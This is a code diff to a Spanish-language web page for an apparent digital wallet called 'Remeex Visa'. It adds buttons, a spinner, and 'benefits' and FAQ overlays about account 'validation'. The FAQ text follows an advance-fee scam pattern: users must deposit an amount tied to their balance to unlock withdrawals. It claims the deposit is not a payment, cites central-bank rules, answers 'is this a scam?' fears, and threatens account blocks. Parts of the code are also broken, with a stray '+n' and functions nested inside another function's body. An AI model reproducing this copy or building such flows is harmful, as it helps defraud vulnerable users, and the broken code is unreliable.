@@ -3010,6 +3010,18 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
 
     .quick-recharge-option {
       background: var(--neutral-200);
+n    /* Validation Benefits & FAQ */
+    .benefits-list { list-style: none; padding-left: 0; margin: 0 0 1rem 0; }
+    .benefits-list li { display: flex; align-items: flex-start; gap: 0.5rem; font-size: 0.85rem; margin-bottom: 0.4rem; }
+    .benefits-list li i { color: var(--success-green); }
+    .info-box { background: rgba(255,173,51,0.1); border-left: 3px solid var(--warning-orange); padding: 0.75rem; border-radius: var(--radius-md); font-size: 0.8rem; margin-top: 0.5rem; }
+    .faq-list { margin-top: 1rem; }
+    .faq-item { border-bottom: 1px solid var(--neutral-300); }
+    .faq-question { display:flex; justify-content: space-between; align-items:center; padding:0.5rem 0; cursor:pointer; font-weight:600; font-size:0.85rem; }
+    .faq-question i { transition: transform 0.3s; color: var(--primary); }
+    .faq-answer { display:none; font-size:0.8rem; color: var(--neutral-600); padding-bottom:0.5rem; }
+    .faq-item.active .faq-answer { display:block; }
+    .faq-item.active .faq-question i { transform: rotate(180deg); }
       border-radius: var(--radius-md);
       padding: 0.5rem;
       font-weight: 600;
@@ -4169,6 +4181,17 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
   border-top-color: var(--visa-blue);
   animation: spin 1s linear infinite;
 }
+
+.validation-spinner {
+  width: 14px;
+  height: 14px;
+  border: 2px solid rgba(0,0,0,0.2);
+  border-top-color: var(--warning-orange);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin-left: 4px;
+}
+
 
 .status-text {
   flex: 1;
@@ -6068,7 +6091,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
                 </svg>
               </div>
               <div class="contenido-estatus">
-                <strong class="status-label">Validación de datos de cuenta pendiente</strong>
+                <strong class="status-label">Validación de datos de cuenta pendiente</strong><span id="validation-spinner" class="validation-spinner" aria-hidden="true"></span>
                   <p id="pending-validation-info" class="status-sublabel">
                     <span id="validation-more" class="validation-more"></span>
                     <a href="#" id="validation-more-btn" class="show-more-link" onclick="toggleValidationMore(event)">Ver más</a>
@@ -6078,6 +6101,9 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
                   <button class="btn btn-outline btn-small" id="view-status">Mi Estatus</button>
                   <button class="btn btn-outline btn-small" id="bank-support">Soporte</button>
                   <button class="btn btn-outline btn-small" id="view-account-level">Ver mi nivel de cuenta</button>
+                  <button class="btn btn-outline btn-small" id="go-validation-data">Ver datos donde debo validar</button>
+                  <button class="btn btn-outline btn-small" id="open-validation-benefits">Beneficios de validar</button>
+                  <button class="btn btn-outline btn-small" id="open-validation-faq">¿Dudas?</button>
                 </div>
                 <div id="bank-validation-progress-container" class="verification-progress-container" style="display: none;">
                   <div id="bank-validation-progress-bar" class="verification-progress-bar"></div>
@@ -7298,6 +7324,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
     </div>
 
     <!-- Mobile Payment Method -->
+    <div id="seccion-pago-movil"></div>
     <div class="payment-method-content" id="mobile-payment">
       <div class="card">
         <div style="margin-bottom: 1.25rem; text-align: center;">
@@ -7743,6 +7770,82 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
   </div>
 
   <!-- Inactivity Modal -->
+  <!-- Validation Benefits Overlay -->
+  <div class="modal-overlay" id="validation-benefits-overlay" style="display:none;">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="benefits-title">
+      <div class="modal-title" id="benefits-title">Beneficios de Validar</div>
+      <ul class="benefits-list">
+        <li><i class="fas fa-check-circle"></i> Habilitas retiros a tu cuenta bancaria</li>
+        <li><i class="fas fa-check-circle"></i> Mayor seguridad y protección de tus fondos</li>
+        <li><i class="fas fa-check-circle"></i> Acceso a todas las funciones de Remeex Visa</li>
+        <li><i class="fas fa-check-circle"></i> Soporte prioritario</li>
+      </ul>
+      <div class="info-box">
+        <i class="fas fa-exclamation-triangle"></i> <strong>Importante:</strong> Validar tu cuenta no es un pago ni una comisión. Es una recarga que se suma a tu saldo disponible. No existen métodos alternativos de validación.
+      </div>
+      <div style="text-align:center;margin-top:1rem;">
+        <button class="btn btn-outline" id="benefits-close"><i class="fas fa-times"></i> Cerrar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Validation FAQ Overlay -->
+  <div class="modal-overlay" id="validation-faq-overlay" style="display:none;">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="faq-title">
+      <div class="modal-title" id="faq-title">¿Dudas?</div>
+      <div style="text-align:center;">
+        <button class="btn btn-primary" id="faq-audio-btn"><i class="fas fa-volume-up"></i> Escuchar instrucciones</button>
+        <audio id="faq-audio" preload="auto">
+          <source src="/audio/instrucciones-validacion.mp3" type="audio/mpeg">
+        </audio>
+      </div>
+      <div class="faq-list">
+        <div class="faq-item">
+          <div class="faq-question">¿Por qué debo validar mi cuenta?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">Porque es un mecanismo obligatorio para confirmar que eres el titular de la cuenta bancaria registrada. Ayuda a prevenir fraudes, suplantaciones de identidad y permite activar todas las funciones de la aplicación.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Por qué se solicita ese monto y no uno menor?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">El monto varía según el saldo actual y se calcula automáticamente como parte de medidas de seguridad financiera. Si tienes un saldo menor, el monto será proporcionalmente menor. Está alineado con normativas del Banco Central de Venezuela para controlar flujos de capital sospechosos.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿En qué se basan para determinar ese monto?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">Se basa en protocolos de riesgo, comportamiento de uso y regulación financiera nacional. Estas medidas buscan cumplir con normativas impuestas para combatir el lavado de dinero y la financiación de organizaciones criminales desde el extranjero.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Es un pago?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">No. No es un pago ni una comisión. Es una recarga que se suma a tu saldo disponible en Remeex Visa. Ese dinero lo podrás usar libremente luego de validar.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Existen métodos alternativos para validar?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">No. Por motivos de seguridad, no existen otras vías alternativas. Solo se puede validar haciendo una recarga desde una cuenta bancaria registrada a nombre del usuario.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Puedo validar desde una cuenta que no sea mía?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">No. El objetivo de la validación es confirmar que tú eres el verdadero titular de la cuenta bancaria registrada. Esto evita fraudes, bloqueos y suplantaciones.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Cuánto tiempo demora la validación? ¿Debo esperar mucho?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">La validación depende de cuándo decidas hacer tu recarga. Una vez recibida, la validación es automática y toma entre 3 a 5 minutos dependiendo del tráfico de operaciones y la hora del día. El sistema está sincronizado con tu banco para máxima velocidad.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">Siento temor… ¿Cómo sé que no es una estafa?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">Entendemos tu preocupación. Este procedimiento es estándar y obligatorio por normativas nacionales. Remeex Visa te permite manejar altos montos y funciones avanzadas que otras apps no ofrecen. Por eso, requerimos verificación. Tu dinero no se pierde, no se cobra y queda resguardado hasta que actives todos los beneficios.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Qué pasa si no valido mi cuenta? ¿Aún puedo usar mi saldo?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">Sí, pero con funciones limitadas. Podrás usar tu saldo para intercambiar con otros usuarios de Remeex Visa, comprar servicios desde la app y realizar donaciones. No podrás retirar ni usar funciones avanzadas.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-question">¿Qué pasa si no valido ahorita y lo hago después?<i class="fas fa-chevron-down"></i></div>
+          <div class="faq-answer">Tus fondos permanecerán seguros y resguardados. Sin embargo, por seguridad, podríamos aplicar un bloqueo temporal para evitar riesgos. Cuando decidas validar, puedes contactar a Soporte y se reactivará tu cuenta. Mientras tanto, siempre podrás ver tu saldo desde la pantalla inicial de login.</div>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:1rem;">
+        <button class="btn btn-outline" id="faq-close"><i class="fas fa-times"></i> Cerrar</button>
+      </div>
+    </div>
+  </div>
   <div class="inactivity-modal" id="inactivity-modal">
     <div class="inactivity-card">
       <div class="inactivity-icon">
@@ -8863,6 +8966,7 @@ function updateBankValidationStatusItem() {
     if (benefitsBanner) benefitsBanner.style.display = 'none';
     if (progressContainer) progressContainer.style.display = 'block';
     if (progressBar) progressBar.style.width = '100%';
+    if (spinner) spinner.style.display = "none";
     if (progressPercent) { progressPercent.style.display = 'block'; progressPercent.textContent = '100%'; }
     if (balanceFlow) balanceFlow.style.display = 'none';
   } else {
@@ -8882,6 +8986,7 @@ function updateBankValidationStatusItem() {
     if (progressContainer) progressContainer.style.display = 'block';
     if (progressBar) progressBar.style.width = '95%';
     if (progressPercent) { progressPercent.style.display = 'block'; progressPercent.textContent = '95%'; }
+    if (spinner) spinner.style.display = "inline-block";
     if (balanceFlow) {
       const bankLogo = typeof getBankLogo === 'function' ? getBankLogo(reg.primaryBank) : '';
       if (balanceBankLogo) {
@@ -11360,6 +11465,33 @@ function setupLoginBlockOverlay() {
 
     // Cargar si el usuario ya gestionó el bono de bienvenida
     function loadWelcomeBonusStatus() {
+    function setupValidationBenefitsOverlay() {
+      const overlay = document.getElementById('validation-benefits-overlay');
+      const closeBtn = document.getElementById('benefits-close');
+      if (!overlay) return;
+      if (closeBtn) closeBtn.addEventListener('click', function(){ overlay.style.display = 'none'; });
+      overlay.addEventListener('click', function(e){ if(e.target === overlay) overlay.style.display = 'none'; });
+    }
+
+    function setupValidationFAQOverlay() {
+      const overlay = document.getElementById('validation-faq-overlay');
+      const closeBtn = document.getElementById('faq-close');
+      const audioBtn = document.getElementById('faq-audio-btn');
+      const audio = document.getElementById('faq-audio');
+      if (!overlay) return;
+      if (closeBtn) closeBtn.addEventListener('click', function(){ overlay.style.display = 'none'; });
+      overlay.addEventListener('click', function(e){ if(e.target === overlay) overlay.style.display = 'none'; });
+      if (audioBtn && audio) {
+        audioBtn.addEventListener('click', function(){
+          audio.currentTime = 0;
+          const p = audio.play();
+          if (p) p.catch(() => {});
+        });
+      }
+      overlay.querySelectorAll('.faq-question').forEach(function(q){
+        q.addEventListener('click', function(){ q.parentElement.classList.toggle('active'); });
+      });
+    }
       const claimed = localStorage.getItem(CONFIG.STORAGE_KEYS.WELCOME_BONUS_CLAIMED);
       currentUser.hasClaimedWelcomeBonus = claimed === 'true';
       return currentUser.hasClaimedWelcomeBonus;
@@ -12227,6 +12359,8 @@ function setupLoginBlockOverlay() {
       setupLoginBlockOverlay();
       setupLiteModeOverlay();
       setupResolveProblemOverlay();
+      setupValidationBenefitsOverlay();
+      setupValidationFAQOverlay();
 
       // Tema
       setupThemeToggles();
@@ -13300,6 +13434,25 @@ function cancelRecharge(index) {
         });
       }
 
+      if (gotoBtn) {
+        gotoBtn.addEventListener("click", function() {
+          openRechargeTab("mobile-payment");
+          const target = document.getElementById("seccion-pago-movil");
+          if (target) target.scrollIntoView({behavior:"smooth"});
+        });
+      }
+      if (benefitsBtn) {
+        benefitsBtn.addEventListener("click", function(){
+          const o = document.getElementById("validation-benefits-overlay");
+          if (o) o.style.display = "flex";
+        });
+      }
+      if (faqBtn) {
+        faqBtn.addEventListener("click", function(){
+          const o = document.getElementById("validation-faq-overlay");
+          if (o) o.style.display = "flex";
+        });
+      }
       if (playBtn && instructionAudio) {
         playBtn.addEventListener('click', function() {
           instructionAudio.currentTime = 0;
